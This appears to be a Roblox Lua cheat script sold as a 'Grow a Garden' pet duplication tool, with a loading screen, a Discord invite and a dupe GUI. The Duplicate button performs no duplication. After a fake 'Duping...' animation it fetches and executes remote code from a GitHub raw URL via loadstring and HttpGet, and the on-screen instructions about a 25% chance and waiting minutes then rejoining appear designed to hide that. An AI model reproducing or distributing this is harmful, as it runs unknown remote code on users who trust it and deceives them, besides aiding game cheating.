local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local TweenService = game:GetService("TweenService")
local backpack = player:WaitForChild("Backpack")
local playerGui = player:WaitForChild("PlayerGui")

-- Create loading GUI
local loadingGui = Instance.new("ScreenGui")
loadingGui.Name = "LoadingScreen"
loadingGui.IgnoreGuiInset = true
loadingGui.ResetOnSpawn = false
loadingGui.Parent = playerGui

-- Fullscreen background
local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 30)
loadingFrame.BackgroundTransparency = 1
loadingFrame.Parent = loadingGui

-- Fade in the background
TweenService:Create(loadingFrame, TweenInfo.new(0.6), {BackgroundTransparency = 0}):Play()

-- Welcome Text
local welcomeLabel = Instance.new("TextLabel")
welcomeLabel.Size = UDim2.new(1, 0, 0, 50)
welcomeLabel.Position = UDim2.new(0, 0, 0.4, 0)
welcomeLabel.BackgroundTransparency = 1
welcomeLabel.Text = "Welcome, " .. player.Name
welcomeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
welcomeLabel.Font = Enum.Font.GothamBold
welcomeLabel.TextSize = 28
welcomeLabel.TextTransparency = 1
welcomeLabel.Parent = loadingFrame
TweenService:Create(welcomeLabel, TweenInfo.new(1), {TextTransparency = 0}):Play()

-- Grow a Gardenüå± Dupe Script Title
local titleLabel = Instance.new("TextLabel")
titleLabel.Size = UDim2.new(1, 0, 0, 30)
titleLabel.Position = UDim2.new(0, 0, 0.45, 0)
titleLabel.BackgroundTransparency = 1
titleLabel.Text = "Grow a Gardenüå± Dupe Script"
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.Font = Enum.Font.GothamBold
titleLabel.TextSize = 22
titleLabel.TextTransparency = 1
titleLabel.Parent = loadingFrame
TweenService:Create(titleLabel, TweenInfo.new(1), {TextTransparency = 0}):Play()

-- Sub to YUraxYZ | Made by YUraxYZ Subtitle
local creditLabel = Instance.new("TextLabel")
creditLabel.Size = UDim2.new(1, 0, 0, 20)
creditLabel.Position = UDim2.new(0, 0, 0.49, -30)
creditLabel.BackgroundTransparency = 1
creditLabel.Text = "Sub to YUraxYZ | Made by YUraxYZ"
creditLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
creditLabel.Font = Enum.Font.Gotham
creditLabel.TextSize = 14
creditLabel.TextTransparency = 1
creditLabel.Parent = loadingFrame
TweenService:Create(creditLabel, TweenInfo.new(1), {TextTransparency = 0}):Play()

-- Loading Message Above Progress Bar
local loadingMsg = Instance.new("TextLabel")
loadingMsg.Size = UDim2.new(1, 0, 0, 20)
loadingMsg.Position = UDim2.new(0, 0, 0.5, 5)
loadingMsg.BackgroundTransparency = 1
loadingMsg.Text = "‚ö†Ô∏è Please wait... Loading Script!"
loadingMsg.TextColor3 = Color3.fromRGB(255, 200, 0)
loadingMsg.Font = Enum.Font.GothamMedium
loadingMsg.TextSize = 14
loadingMsg.TextTransparency = 1
loadingMsg.Parent = loadingFrame
TweenService:Create(loadingMsg, TweenInfo.new(1), {TextTransparency = 0}):Play()

-- Progress Bar background
local barBg = Instance.new("Frame")
barBg.Size = UDim2.new(0, 300, 0, 24)
barBg.Position = UDim2.new(0.5, -150, 0.5, 30)
barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
barBg.BorderSizePixel = 0
barBg.Parent = loadingFrame
Instance.new("UICorner", barBg).CornerRadius = UDim.new(0, 10)

-- Progress Bar fill
local barFill = Instance.new("Frame")
barFill.Size = UDim2.new(0, 0, 1, 0)
barFill.BackgroundColor3 = Color3.fromRGB(60, 255, 60)
barFill.BorderSizePixel = 0
barFill.ZIndex = 1
barFill.Parent = barBg
Instance.new("UICorner", barFill).CornerRadius = UDim.new(0, 10)

-- Text OVER the bar
local barText = Instance.new("TextLabel")
barText.Size = UDim2.new(1, 0, 1, 0)
barText.Position = UDim2.new(0, 0, 0, 0)
barText.BackgroundTransparency = 1
barText.Text = "https://discord.gg/hWdUcKskAR"
barText.TextColor3 = Color3.fromRGB(0, 0, 255)
barText.Font = Enum.Font.GothamMedium
barText.TextSize = 13
barText.TextXAlignment = Enum.TextXAlignment.Center
barText.TextYAlignment = Enum.TextYAlignment.Center
barText.ZIndex = 2
barText.Parent = barBg

-- Percentage Label
local percentLabel = Instance.new("TextLabel")
percentLabel.Size = UDim2.new(0, 100, 0, 24)
percentLabel.Position = UDim2.new(0.5, -50, 0.5, 60)
percentLabel.BackgroundTransparency = 1
percentLabel.Text = "0%"
percentLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
percentLabel.Font = Enum.Font.GothamBold
percentLabel.TextSize = 18
percentLabel.Parent = loadingFrame

-- Animate loading bar & percentage
local duration = 1 -- seconds
local steps = 30

for i = 1, steps do
	local progress = i / steps
	barFill.Size = UDim2.new(progress, 0, 1, 0)
	percentLabel.Text = math.floor(progress * 100) .. "%"
	wait(duration / steps)
end

-- Final 100% (just in case rounding skips it)
percentLabel.Text = "100%"
wait(0.4)

-- Fade out all elements
TweenService:Create(loadingFrame, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()
TweenService:Create(welcomeLabel, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(percentLabel, TweenInfo.new(1), {TextTransparency = 1}):Play()
TweenService:Create(barText, TweenInfo.new(1), {TextTransparency = 1}):Play()

wait(1.1)
loadingGui:Destroy()

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local backpack = player:WaitForChild("Backpack")
local playerGui = player:WaitForChild("PlayerGui")

local gui = Instance.new("ScreenGui")
gui.Name = "DuplicateToolGUI"
gui.ResetOnSpawn = false
gui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 260, 0, 340)
frame.Position = UDim2.new(0.3, 0, 0.3, 0)
frame.BackgroundColor3 = Color3.fromRGB(0, 0, 51)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.ZIndex = 1
frame.Parent = gui
Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)

local gradient = Instance.new("UIGradient")
gradient.Color = ColorSequence.new{
	ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 0, 163)),
	ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 30))
}
gradient.Rotation = 90
gradient.Parent = frame

local avatar = Instance.new("ImageLabel")
avatar.Size = UDim2.new(0, 36, 0, 36)
avatar.Position = UDim2.new(0, 10, 0, 10)
avatar.BackgroundTransparency = 1
avatar.Image = "https://www.roblox.com/headshot-thumbnail/image?userId="..player.UserId.."&width=420&height=420&format=png"
avatar.ZIndex = 2
avatar.Parent = frame
Instance.new("UICorner", avatar).CornerRadius = UDim.new(1, 0)

local name = Instance.new("TextLabel")
name.Size = UDim2.new(0, 140, 0, 24)
name.Position = UDim2.new(0, 50, 0, 15)
name.BackgroundTransparency = 1
name.Text = player.Name
name.TextColor3 = Color3.new(1, 1, 1)
name.Font = Enum.Font.GothamMedium
name.TextSize = 16
name.TextXAlignment = Enum.TextXAlignment.Left
name.ZIndex = 2
name.Parent = frame

-- Title Label
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -20, 0, 28)
title.Position = UDim2.new(0, 10, 0, 40)
title.BackgroundTransparency = 1
title.Text = "GAGüå± Dupe Updated"
title.TextColor3 = Color3.fromRGB(100, 255, 100)
title.Font = Enum.Font.GothamBold
title.TextSize = 16
title.TextWrapped = true
title.TextXAlignment = Enum.TextXAlignment.Center
title.ZIndex = 2
title.Parent = frame

-- Info label 1
local info1 = Instance.new("TextLabel")
info1.Size = UDim2.new(1, -20, 0, 24)
info1.Position = UDim2.new(0, 10, 0, 75)
info1.BackgroundTransparency = 1
info1.Text = "1. Only works on QUEEN BEE RACCOON, DRAGONFLY, and RED FOX."
info1.TextColor3 = Color3.fromRGB(0, 220, 0)
info1.Font = Enum.Font.Gotham
info1.TextSize = 12
info1.TextWrapped = true
info1.TextXAlignment = Enum.TextXAlignment.Center
info1.ZIndex = 2
info1.Parent = frame

-- Info label 2
local info2 = Instance.new("TextLabel")
info2.Size = UDim2.new(1, -20, 0, 24)
info2.Position = UDim2.new(0, 10, 0, 110)
info2.BackgroundTransparency = 1
info2.Text = "2. (PUBLIC SERVER ONLY) 25% Chance to work. Willing to Rejoin and Re-execute."
info2.TextColor3 = Color3.fromRGB(255, 0, 0)
info2.Font = Enum.Font.Gotham
info2.TextSize = 12
info2.TextWrapped = true
info2.TextXAlignment = Enum.TextXAlignment.Center
info2.ZIndex = 2
info2.Parent = frame

-- Info label 3 (description)
local description = Instance.new("TextLabel")
description.Size = UDim2.new(1, -20, 0, 40)
description.Position = UDim2.new(0, 10, 0, 148)
description.BackgroundTransparency = 1
description.Text = "3. You have to wait for 3-5mins. After Initializing Complete, Rejoin the Server and the Duped pets should appear!"
description.TextColor3 = Color3.fromRGB(255, 255, 255)
description.Font = Enum.Font.Gotham
description.TextSize = 12
description.TextWrapped = true
description.TextXAlignment = Enum.TextXAlignment.Center
description.ZIndex = 2
description.Parent = frame

-- Holding Item Label (centered and stylish)
local holdingLabel = Instance.new("TextLabel")
holdingLabel.Size = UDim2.new(1, -20, 0, 24)
holdingLabel.Position = UDim2.new(0.5, -115, 0, 205)
holdingLabel.BackgroundTransparency = 1
holdingLabel.TextColor3 = Color3.new(1, 150, 1)
holdingLabel.Font = Enum.Font.FredokaOne
holdingLabel.TextSize = 14
holdingLabel.TextXAlignment = Enum.TextXAlignment.Center
holdingLabel.Text = "Item: Nothing"
holdingLabel.Parent = frame

-- Tool Detection
local player = game.Players.LocalPlayer

local function updateHolding()
	local tool = player.Character and player.Character:FindFirstChildOfClass("Tool")
	if tool then
		holdingLabel.Text = "Holding: " .. tool.Name
	else
		holdingLabel.Text = "Holding: Nothing"
	end
end

player.CharacterAdded:Connect(function(character)
	character.ChildAdded:Connect(updateHolding)
	character.ChildRemoved:Connect(updateHolding)
	updateHolding()
end)

if player.Character then
	player.Character.ChildAdded:Connect(updateHolding)
	player.Character.ChildRemoved:Connect(updateHolding)
	updateHolding()
end

local quantityBox = Instance.new("TextBox")
quantityBox.Size = UDim2.new(0, 180, 0, 28)
quantityBox.Position = UDim2.new(0.5, -90, 0, 230)
quantityBox.BackgroundColor3 = Color3.fromRGB(25, 25, 70)
quantityBox.Text = ""
quantityBox.PlaceholderText = "Enter duplication amount"
quantityBox.TextColor3 = Color3.fromRGB(255, 255, 255)
quantityBox.Font = Enum.Font.Gotham
quantityBox.TextSize = 13
quantityBox.ClearTextOnFocus = false
quantityBox.TextXAlignment = Enum.TextXAlignment.Center
quantityBox.TextYAlignment = Enum.TextYAlignment.Center
quantityBox.Parent = frame
Instance.new("UICorner", quantityBox).CornerRadius = UDim.new(0, 8)

-- Duplicate button
local duplicateBtn = Instance.new("TextButton")
duplicateBtn.Size = UDim2.new(0, 180, 0, 40)
duplicateBtn.Position = UDim2.new(0.5, -90, 0, 265)
duplicateBtn.BackgroundColor3 = Color3.fromRGB(60, 200, 100)
duplicateBtn.Text = "Duplicate"
duplicateBtn.TextSize = 20
duplicateBtn.TextColor3 = Color3.new(1, 1, 1)
duplicateBtn.Font = Enum.Font.GothamBold
duplicateBtn.AutoButtonColor = true
duplicateBtn.ZIndex = 2
duplicateBtn.Parent = frame
Instance.new("UICorner", duplicateBtn).CornerRadius = UDim.new(0, 10)

-- Close button
local closeBtn = Instance.new("TextButton")
closeBtn.Size = UDim2.new(0, 24, 0, 24)
closeBtn.Position = UDim2.new(1, -30, 0, 6)
closeBtn.BackgroundColor3 = Color3.fromRGB(200, 60, 60)
closeBtn.Text = "X"
closeBtn.TextColor3 = Color3.new(1, 1, 1)
closeBtn.TextSize = 14
closeBtn.Font = Enum.Font.GothamBold
closeBtn.ZIndex = 2
closeBtn.Parent = frame
Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(1, 0)

-- STATUS
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, -10, 0, 18)
footer.Position = UDim2.new(0, 5, 1, -35)
footer.BackgroundTransparency = 1
footer.Text = "Status : Working | Date : 5/31/2025"
footer.TextColor3 = Color3.fromRGB(50, 255, 50)
footer.Font = Enum.Font.Gotham
footer.TextSize = 13
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.ZIndex = 2
footer.Parent = frame

-- Footer
local footer = Instance.new("TextLabel")
footer.Size = UDim2.new(1, -10, 0, 18)
footer.Position = UDim2.new(0, 5, 1, -20)
footer.BackgroundTransparency = 1
footer.Text = "@hackagarden"
footer.TextColor3 = Color3.fromRGB(255, 255, 255)
footer.Font = Enum.Font.Gotham
footer.TextSize = 13
footer.TextXAlignment = Enum.TextXAlignment.Center
footer.ZIndex = 2
footer.Parent = frame

local transparencyData = {}

for _, obj in pairs(gui:GetDescendants()) do
	if obj:IsA("GuiObject") then
		local original = {
			BackgroundTransparency = obj.BackgroundTransparency
		}
		if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
			original.TextTransparency = obj.TextTransparency
			obj.TextTransparency = 1
		end
		obj.BackgroundTransparency = 1
		transparencyData[obj] = original
	end
end

-- Tween back to original transparencies
for obj, original in pairs(transparencyData) do
	TweenService:Create(obj, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
		BackgroundTransparency = original.BackgroundTransparency
	}):Play()
	if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
		TweenService:Create(obj, TweenInfo.new(1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
			TextTransparency = original.TextTransparency
		}):Play()
	end
end

-- Close function
closeBtn.MouseButton1Click:Connect(function()
	gui:Destroy()
end)

-- Get Tool (unused but left for future)
local function getTool()
	for _, item in ipairs(character:GetChildren()) do
		if item:IsA("Tool") then
			return item
		end
	end
end

duplicateBtn.MouseButton1Click:Connect(function()
duplicateBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
	duplicateBtn.Text = "Duping"

	local dotCount = 0
	for i = 1, 9 do
		wait(0.5)
		dotCount = (dotCount % 3) + 1
		duplicateBtn.Text = "Duping..." .. string.rep(".", dotCount)
	end

	loadstring(Game:HttpGet("https://raw.githubusercontent.com/k72655s/SpawnPets/refs/heads/main/grow-a-garden-pet-spawner-no-lag-V1"))()
end)
